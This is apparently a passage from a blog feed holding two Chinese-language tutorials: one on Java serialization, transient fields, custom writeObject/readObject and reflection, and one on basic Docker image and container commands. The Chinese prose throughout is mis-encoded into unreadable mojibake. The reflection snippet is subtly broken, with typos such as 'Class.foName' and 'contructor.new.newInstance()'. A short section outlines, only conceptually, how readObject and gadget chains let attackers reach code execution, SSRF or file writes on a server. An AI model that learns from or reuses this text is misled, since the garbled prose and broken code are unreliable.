class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyList</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    transient è¡¨ç¤ºè¯¥æˆå‘˜ arr ä¸éœ€è¦è¢«åºåˆ—åŒ–</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> Object[] arr;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyList</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyList</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.arr = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">100</span>];</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        ç»™å‰é¢30ä¸ªå…ƒç´ è¿›è¡Œåˆå§‹åŒ–</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">30</span>; i++) &#123;</span><br><span class="line">            <span class="built_in">this</span>.arr[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;MyList&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, arr=&quot;</span> + Arrays.toString(arr) +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">//-------------------------- è‡ªå®šä¹‰åºåˆ—åŒ–ååºåˆ—åŒ– arr å…ƒç´  ------------------</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Save the state of the &lt;tt&gt;ArrayList&lt;/tt&gt; instance to a stream (that</span></span><br><span class="line"><span class="comment">     * is, serialize it).</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@serialData</span> The length of the array backing the &lt;tt&gt;ArrayList&lt;/tt&gt;</span></span><br><span class="line"><span class="comment">     * instance is emitted (int), followed by all of its elements</span></span><br><span class="line"><span class="comment">     * (each an &lt;tt&gt;Object&lt;/tt&gt;) in the proper order.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">            <span class="keyword">throws</span> java.io.IOException &#123;</span><br><span class="line">        <span class="comment">//æ‰§è¡Œ JVM é»˜è®¤çš„åºåˆ—åŒ–æ“ä½œ</span></span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment">//æ‰‹åŠ¨åºåˆ—åŒ– arr  å‰é¢30ä¸ªå…ƒç´ </span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">30</span>; i++) &#123;</span><br><span class="line">            s.writeObject(arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Reconstitute the &lt;tt&gt;ArrayList&lt;/tt&gt; instance from a stream (that is,</span></span><br><span class="line"><span class="comment">     * deserialize it).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">            <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line"> </span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        arr = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">30</span>];</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">30</span>; i++) &#123;</span><br><span class="line">            arr[i] = s.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>æµ‹è¯•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransientMain</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FILE_PATH</span> <span class="operator">=</span> <span class="string">&quot;./transient.bin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        serializeMyList();</span><br><span class="line"> </span><br><span class="line">        deserializeMyList();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializeMyList</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;åºåˆ—åŒ–...&quot;</span>);</span><br><span class="line">        <span class="type">MyList</span> <span class="variable">myList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyList</span>(<span class="string">&quot;ArrayList&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(FILE_PATH));</span><br><span class="line">        oos.writeObject(myList);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    1.å¦‚æœ private  Object[] arr; æ²¡æœ‰ä½¿ç”¨ transient ï¼Œé‚£ä¹ˆæ•´ä¸ªæ•°ç»„éƒ½ä¼šè¢«ä¿å­˜ï¼Œè€Œä¸æ˜¯ä¿å­˜å®é™…å­˜å‚¨çš„æ•°æ®</span></span><br><span class="line"><span class="comment">    è¾“å‡ºç»“æœï¼šMyList&#123;name=&#x27;ArrayList&#x27;, arr=[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null]&#125;</span></span><br><span class="line"><span class="comment">    2.private transient Object[] arr;è®¾ç½®äº† transientï¼Œè¡¨ç¤º arr å…ƒç´ ä¸è¿›è¡Œåºåˆ—åŒ–</span></span><br><span class="line"><span class="comment">    è¾“å‡ºç»“æœï¼šMyList&#123;name=&#x27;ArrayList&#x27;, arr=null&#125;</span></span><br><span class="line"><span class="comment">    3.å‚è€ƒ ArrayList å¤„ç†å†…éƒ¨çš„ transient Object[] elementData; æ•°ç»„æ˜¯é€šè¿‡ writeObject å’Œ readObject å®ç°çš„</span></span><br><span class="line"><span class="comment">    æˆ‘ä»¬çš„ MyList å†…éƒ¨ä¹Ÿå¯ä»¥å€Ÿé‰´è¿™ç§æ–¹å¼å®ç°transientå…ƒç´ çš„æ‰‹åŠ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserializeMyList</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ååºåˆ—åŒ–...&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(FILE_PATH));</span><br><span class="line">        <span class="type">MyList</span> <span class="variable">myList</span> <span class="operator">=</span> (MyList) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        System.out.println(myList);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>æµ‹è¯•ç»“æœ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">åºåˆ—åŒ–...</span><br><span class="line">writeObject...</span><br><span class="line">ååºåˆ—åŒ–...</span><br><span class="line">readObject...</span><br><span class="line">MyList&#123;name=&#x27;ArrayList&#x27;, arr=[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29]&#125;</span><br></pre></td></tr></table></figure><p>6.Serializable åœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿‡ç¨‹ä¸­å¤§é‡ä½¿ç”¨äº†åå°„ï¼Œå› æ­¤å…¶è¿‡ç¨‹ä¼šäº§ç”Ÿçš„å¤§é‡çš„å†…å­˜ç¢ç‰‡</p><p>###ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜ï¼Ÿ</p><p>åªè¦æœåŠ¡ç«¯ååºåˆ—åŒ–æ•°æ®ï¼Œå®¢æˆ·ç«¯ä¼ é€’ç±»çš„readObjectä¸­ä»£ç ä¼šè¢«è‡ªåŠ¨æ‰§è¡Œï¼Œç»™äºˆæ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œä»£ç çš„èƒ½åŠ›</p><p>å¯èƒ½çš„å½¢å¼</p><p>1.å…¥å£ç±»çš„readObjectç›´æ¥è°ƒç”¨å±é™©æ–¹æ³•</p><p>2.å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§äº†ï¼Œè¯¥ç±»æœ‰å±é™©æ–¹æ³•ï¼ŒreadObjectæ—¶è¢«è°ƒç”¨</p><p>3.å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»åˆè°ƒç”¨å…¶ä»–æœ‰å±é™©æ–¹æ³•çš„ç±»ï¼ŒreadObjectæ—¶è°ƒç”¨</p><p>æ¯”å¦‚ç±»å®šä¹‰ç±»å‹ä¸ºObjectï¼Œè°ƒç”¨equals&#x2F;hashcode&#x2F;toString</p><p>é‡ç‚¹ ç›¸åŒç±»å‹ï¼ŒåŒåå‡½æ•°</p><p>4.æ„é€ å‡½æ•°&#x2F;é™æ€ä»£ç å¿«ç­‰ç±»åŠ è½½æ—¶éšå¼æ‰§è¡Œã€‚</p><p>å…±ç”¨æ¡ä»¶ ç»§æ‰¿serialize </p><p>å…¥å£ç±» sourceï¼ˆé‡å†™readObject å‚æ•°ç±»å‹å®½æ³› æœ€å¥½jdkè‡ªå¸¦</p><p>è°ƒç”¨é“¾ gadget chain</p><p>æ‰§è¡Œç±» sink ï¼ˆrce ssrf å†™æ–‡ä»¶ç­‰ç­‰</p><h2 id="åå°„çš„ç†è§£"><a href="#åå°„çš„ç†è§£" class="headerlink" title="åå°„çš„ç†è§£"></a>åå°„çš„ç†è§£</h2><p>Javaçš„åå°„æœºåˆ¶æ˜¯å€¼åœ¨äº‘ç¿”çŠ¶æ€ä¸­ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç±»éƒ½èƒ½å¤ŸçŸ¥é“è¿™ä¸ªç±»æ‰€æœ‰çš„å±æ€§å’Œæ–¹æ³•ï¼›è¿™ç§åŠ¨æ€è·å–ä¿¡æ¯ä¸€èŠ‚åŠ¨æ€è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•çš„åŠŸèƒ½æˆä¸ºjavaè¯­è¨€çš„åå°„æœºåˆ¶ã€‚</p><h3 id="ç™½è¯ç†è§£"><a href="#ç™½è¯ç†è§£" class="headerlink" title="ç™½è¯ç†è§£"></a>ç™½è¯ç†è§£</h3><p>æ­£å°„ï¼Œ</p><p>ä¸‡ç‰©æœ‰é˜´å¿…æœ‰é˜³ï¼Œæœ‰æ­£å¿…æœ‰åï¼Œæ—¢ç„¶æœ‰åå°„ï¼Œå°±å¿…æœ‰æ­£å°„ã€‚</p><p>é‚£ä¹ˆæ­£å°„æ˜¯ä»€ä¹ˆå‘¢</p><p>å½“æˆ‘ä»¬å†™å†™ä»£ç çš„æ—¶å€™ï¼Œåˆ°éœ€è¦å»ç”¨åˆ°æŸä¸€ä¸ªç±»çš„æ—¶å€™ï¼Œéƒ½ä¼šå…ˆå»äº†è§£è¿™ä¸ªç±»æ˜¯åšä»€ä¹ˆçš„ï¼Œç„¶åå®ä¾‹åŒ–è¿™åˆ—ï¼Œæ¥ç€ä½¿ç”¨å®ä¾‹åŒ–å¥½çš„å¯¹è±¡è¿›è¡Œæ“ä½œï¼Œè¿™æ—¢æ˜¯æ­£å°„</p><p>Student student &#x3D;new Student();</p><p>student.homework(â€œæ•°å­¦â€)ï¼›</p><p>åå°„ </p><p>åå°„å°±æ˜¯ä¸€å¼€å§‹ä½ å¹¶ä¸çŸ¥é“æˆ‘ä»¬åˆå§‹åŒ–çš„ç±»çš„å¯¹è±¡æ˜¯ä»€ä¹ˆï¼Œè‡ªç„¶ä¹Ÿå°±æ— æ³•ä½¿ç”¨newè¿™ä¸€ç±»å…³é”®å­—æ¥åˆ›å»ºå¯¹è±¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Class clazz=Class.foName(&quot;reflection.Student&quot;);</span><br><span class="line"></span><br><span class="line">Method method =clazz.getMethod(&quot;doHomework&quot;,String.class);</span><br><span class="line"></span><br><span class="line">Constructor constructor =clazz.getConstructor();</span><br><span class="line"></span><br><span class="line">Object object =contructor.new.newInstance();</span><br><span class="line"></span><br><span class="line">method.invoke(object,&quot;è¯­æ–‡&quot;);</span><br></pre></td></tr></table></figure><p>åå°„çš„ä½œç”¨ï¼šè®©javaå…·æœ‰åŠ¨æ€æ€§ï¼Œ</p><p>å°±æ˜¯åœ¨ä»£ç è¿è¡Œçš„æ—¶å€™ï¼ŒåŠ¨æ€çš„è¿›è¡Œå®ä¾‹åŒ–</p><p>å¯ä»¥ä¿®æ”¹å·²æœ‰å¯¹è±¡çš„å±æ€§</p><p>åŠ¨æ€ç”Ÿæˆå¯¹è±¡</p><p>åŠ¨æ€è°ƒç”¨æ–¹æ³•</p><p>æ“ä½œå†…éƒ¨ç±»å’Œç§æœ‰æ–¹æ³•</p><p>åœ¨ååºåˆ—åŒ–ä¸­ï¼Œå®šåˆ¶éœ€è¦çš„å¯¹è±¡ï¼Œ</p><p>é€šè¿‡invokeè°ƒç”¨å‡ºäº†åŒåå‡½æ•°ä»¥å¤–çš„å‡½æ•°ï¼Œé€šè¿‡Classäº†å™¨åˆ›å»ºå¯¹è±¡ï¼Œå¼•å…¥ä¸èƒ½åºåˆ—åŒ–çš„ç±»</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Docker File çš„åŸºæœ¬æ“ä½œ</title>
      <link href="/2023/09/20/Docker%20file%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
      <url>/2023/09/20/Docker%20file%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker-file-çš„åŸºæœ¬æ“ä½œ"><a href="#Docker-file-çš„åŸºæœ¬æ“ä½œ" class="headerlink" title="Docker file çš„åŸºæœ¬æ“ä½œ"></a>Docker file çš„åŸºæœ¬æ“ä½œ</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure><p><img src="/2023/09/20/Docker%20file%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image/image-20230919184844700-1700990334962-123-1700994526524-97.png"></p><p>å‡ºç°è¿™ç§æƒ…å†µå°±è¯´æ˜æ­£å¸¸ï¼Œ</p><h2 id="å¯¹Dockeræ“ä½œ"><a href="#å¯¹Dockeræ“ä½œ" class="headerlink" title="å¯¹Dockeræ“ä½œ"></a>å¯¹Dockeræ“ä½œ</h2><p>å®‰è£…å®ŒæˆDockerå,é»˜è®¤æ¯æ¬¡å¼€æœºçš„æ—¶å€™éƒ½ä¼šè‡ªåŠ¨å¯åŠ¨,ä½†æˆ‘ä»¬ä¹Ÿå¯ä»¥æ‰‹åŠ¨å¯åŠ¨,å…³é—­æˆ–è€…é‡å¯Docker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># å¯åŠ¨docker</span><br><span class="line">sudo service docker start</span><br><span class="line"># é‡å¯docker</span><br><span class="line">sudo service docker restart</span><br><span class="line"># åœæ­¢docker</span><br><span class="line">sudo service docker stop</span><br></pre></td></tr></table></figure><h2 id="å¯¹é•œåƒçš„åŸºç¡€æ“ä½œ"><a href="#å¯¹é•œåƒçš„åŸºç¡€æ“ä½œ" class="headerlink" title="å¯¹é•œåƒçš„åŸºç¡€æ“ä½œ"></a>å¯¹é•œåƒçš„åŸºç¡€æ“ä½œ</h2><h3 id="è·å–å½“æ—¶æ‰€æœ‰é•œåƒ-docker-images"><a href="#è·å–å½“æ—¶æ‰€æœ‰é•œåƒ-docker-images" class="headerlink" title="è·å–å½“æ—¶æ‰€æœ‰é•œåƒ(docker images)"></a>è·å–å½“æ—¶æ‰€æœ‰é•œåƒ(docker images)</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker image <span class="built_in">ls</span></span><br><span class="line"><span class="comment"># æˆ–è€…</span></span><br><span class="line">docker images</span><br></pre></td></tr></table></figure><table><thead><tr><th>æ ‡ç­¾</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>REPOSITORY</td><td>é•œåƒæ‰€åœ¨çš„ä»“åº“åç§°</td></tr><tr><td>TAG</td><td>é•œåƒæ ‡ç­¾</td></tr><tr><td>IMAGEID</td><td>é•œåƒID</td></tr><tr><td>CREATED</td><td>é•œåƒçš„åˆ›å»ºæ—¥æœŸ(ä¸æ˜¯è·å–è¯¥é•œåƒçš„æ—¥æœŸ)</td></tr><tr><td>SIZE</td><td>é•œåƒå¤§å°</td></tr></tbody></table><h3 id="æ‹‰å»é•œåƒ-docker-pull"><a href="#æ‹‰å»é•œåƒ-docker-pull" class="headerlink" title="æ‹‰å»é•œåƒ(docker pull)"></a>æ‹‰å»é•œåƒ(docker pull)</h3><p>é™¤äº†ä½¿ç”¨å®˜æ–¹çš„é•œåƒå¤–,æˆ‘ä»¬è¿˜å¯ä»¥åœ¨ä»“åº“ä¸­ç”³è¯·ä¸€ä¸ªè‡ªå·±çš„è´¦å·,ä¿å­˜è‡ªå·±åˆ¶ä½œçš„è¿›è¡Œ,æˆ–è€…æ‹‰å»ä½¿ç”¨ä»–äººçš„é•œåƒã€‚</p><h1 id="å®˜æ–¹é•œåƒ"><a href="#å®˜æ–¹é•œåƒ" class="headerlink" title="å®˜æ–¹é•œåƒ"></a>å®˜æ–¹é•œåƒ</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">docker image pull é•œåƒåç§° </span><br><span class="line"># æˆ–ç®€å†™ä¸º </span><br><span class="line">docker pull é•œåƒåç§°</span><br><span class="line"># æ¯”å¦‚</span><br><span class="line">docker pull ubuntu</span><br><span class="line">docker pull ubuntu:16.04</span><br><span class="line"></span><br><span class="line"># ä¸ªäººé•œåƒ</span><br><span class="line">docker pull ä»“åº“åç§°/é•œåƒåç§°</span><br><span class="line">docker pull xunmi/django</span><br><span class="line"></span><br><span class="line"># ç¬¬ä¸‰æ–¹ä»“åº“æ‹‰å»</span><br><span class="line">docker pull ç¬¬ä¸‰æ–¹ä»“åº“åœ°å€/ä»“åº“åç§°/é•œåƒåç§°</span><br><span class="line">docker pull hub.c.163.com/library/mysql:latest</span><br><span class="line">(é»˜è®¤ä»“åº“åä¸ºlibrary,æ‰€æœ‰ä»å®˜æ–¹è·å–é•œåƒç›¸å½“äº`sudo docker image pull library/é•œåƒåç§°`)</span><br></pre></td></tr></table></figure><h3 id="åˆ é™¤é•œåƒ-docker-rmi"><a href="#åˆ é™¤é•œåƒ-docker-rmi" class="headerlink" title="åˆ é™¤é•œåƒ(docker rmi)"></a>åˆ é™¤é•œåƒ(docker rmi)</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker image <span class="built_in">rm</span> é•œåƒåæˆ–é•œåƒID æˆ– docker rmi é•œåƒåæˆ–é•œåƒID</span><br><span class="line">docker image <span class="built_in">rm</span> hello<span class="literal">-world</span></span><br><span class="line">docker rmi <span class="number">9</span>e64176cd8a2</span><br></pre></td></tr></table></figure><p>åˆ é™¤é•œåƒçš„å‰ææ˜¯æ²¡æœ‰ä½¿ç”¨è¿™ä¸ªé•œåƒçš„å®¹å™¨,å¦‚æœæœ‰éœ€è¦å…ˆåˆ é™¤å®¹å™¨(æŠ¥é”™:Error response from daemon: conflict: unable to delete é•œåƒID (must be forced) - image is being used by stopped container å®¹å™¨IDåˆ™ä»£è¡¨æœ‰å®¹å™¨ä½¿ç”¨äº†æ­¤é•œåƒã€‚)å¯ä»¥å°è¯•å…ˆæ‰§è¡Œdocker rm å®¹å™¨IDåˆ é™¤å®¹å™¨,å¦‚æœè¿˜æŠ¥é”™,å¯ä»¥çœ‹æˆ‘ä¸‹æ–¹åˆ é™¤å®¹å™¨çš„å…·ä½“æ–¹æ³•ã€‚<br>å‡ æ¡åˆ é™¤å‘½ä»¤çš„åŒºåˆ«</p><ul><li><p>docker rm: åˆ é™¤ä¸€ä¸ªæˆ–å¤šä¸ª å®¹å™¨</p></li><li><p>docker rmi: åˆ é™¤ä¸€ä¸ªæˆ–å¤šä¸ª é•œåƒ</p></li><li><p>docker prune: ç”¨æ¥åˆ é™¤ä¸å†ä½¿ç”¨çš„ docker å¯¹è±¡</p><p>##åŠ è½½é•œåƒ(docker run)</p><p>ä¸Šé¢æˆ‘ä»¬è¯´è¿‡,é•œåƒåªæ˜¯ä¸€ä¸ªåªè¯»ç±»å‹çš„æ–‡ä»¶,è€Œæˆ‘ä»¬çš„ç¯å¢ƒä¸å¯èƒ½åªæ˜¯ä¸€ä¸ªè¿™æ ·çš„æ–‡ä»¶,æ‰€ä»¥æˆ‘ä»¬éœ€è¦æŠŠè¿™ä¸ªé•œåƒåŠ è½½æˆæˆ‘ä»¬çš„ç¯å¢ƒ,ä¹Ÿå°±æ˜¯è®©ä»–å˜æˆå®¹å™¨ã€‚</p></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run [å¯é€‰å‚æ•°] é•œåƒå [å‘å¯åŠ¨å®¹å™¨ä¸­ä¼ å…¥çš„å‘½ä»¤]</span><br></pre></td></tr></table></figure><p>å¸¸ç”¨å¯é€‰å‚æ•°ä½œç”¨<br>-iè¡¨ç¤ºä»¥ã€Šäº¤äº’æ¨¡å¼ã€‹è¿è¡Œå®¹å™¨ã€‚<br>-dä¼šåˆ›å»ºä¸€ä¸ªå®ˆæŠ¤å¼å®¹å™¨åœ¨åå°è¿è¡Œ(è¿™æ ·åˆ›å»ºå®¹å™¨åä¸ä¼šè‡ªåŠ¨ç™»å½•å®¹å™¨)ã€‚<br>-tè¡¨ç¤ºå®¹å™¨å¯åŠ¨åä¼šè¿›å…¥å…¶å‘½ä»¤è¡Œã€‚åŠ å…¥è¿™ä¸¤ä¸ªå‚æ•°åï¼Œå®¹å™¨åˆ›å»ºå°±èƒ½ç™»å½•è¿›å»ã€‚å³åˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯ã€‚<br>â€“nameä¸ºåˆ›å»ºçš„å®¹å™¨å‘½åã€‚(é»˜è®¤ä¼šéšæœºç»™åå­—,ä¸æ”¯æŒä¸­æ–‡å­—ç¬¦!!!)<br>-vè¡¨ç¤ºç›®å½•æ˜ å°„å…³ç³»ï¼Œå³å®¿ä¸»æœºç›®å½•:å®¹å™¨ä¸­ç›®å½•ã€‚æ³¨æ„:æœ€å¥½åšç›®å½•æ˜ å°„ï¼Œåœ¨å®¿ä¸»æœºä¸Šåšä¿®æ”¹ï¼Œç„¶åå…±äº«åˆ°å®¹å™¨ä¸Šã€‚<br>-pè¡¨ç¤ºç«¯å£æ˜ å°„ï¼Œå³å®¿ä¸»æœºç«¯å£:å®¹å™¨ä¸­ç«¯å£ã€‚ æ¯”å¦‚:-p 8080:80 å°±æ˜¯å°†å®¹å™¨ä¸­çš„80ç«¯å£,æ˜ å°„åˆ°ä¸»æœºä¸­çš„8080ç«¯å£<br>â€“network&#x3D;hostè¡¨ç¤ºå°†ä¸»æœºçš„ç½‘ç»œç¯å¢ƒæ˜ å°„åˆ°å®¹å™¨ä¸­ï¼Œä½¿å®¹å™¨çš„ç½‘ç»œä¸ä¸»æœºç›¸åŒã€‚æ¯ä¸ª Docker å®¹å™¨éƒ½æœ‰è‡ªå·±çš„ç½‘ç»œè¿æ¥ç©ºé—´è¿æ¥åˆ°è™šæ‹Ÿ LANã€‚ä½¿ç”¨æ­¤å‘½ä»¤åˆ™ä¼šè®©å®¹å™¨å’Œä¸»æœºå…±äº«ä¸€ä¸ªç½‘ç»œç©ºé—´ã€‚</p><p>å¯ä»¥å¯åŠ¨ä¸€ä¸ªç³»ç»Ÿdocker run -i -d -t â€“name&#x3D;kali-test kalilinux&#x2F;kali-rolling(è¿™é‡Œæˆ‘ä½¿ç”¨linuxçš„ä¸€ä¸ªå‘è¡Œç‰ˆkaliä½œä¸ºä»‹ç»)<br>æˆ–å¯ä»¥ç®€å†™ä¸ºdocker run -idt â€“name&#x3D;kali-test kalilinux&#x2F;kali-rolling<br>PS: å¦‚æœåŠ è½½ä¸€ä¸ªæˆ‘ä»¬æ²¡æœ‰çš„é•œåƒ,dockerä¼šè‡ªåŠ¨ä»å®˜æ–¹ä»“åº“ä¸­è¿›è¡Œæ‹‰å»ã€‚</p><p>å¦‚æœä½ 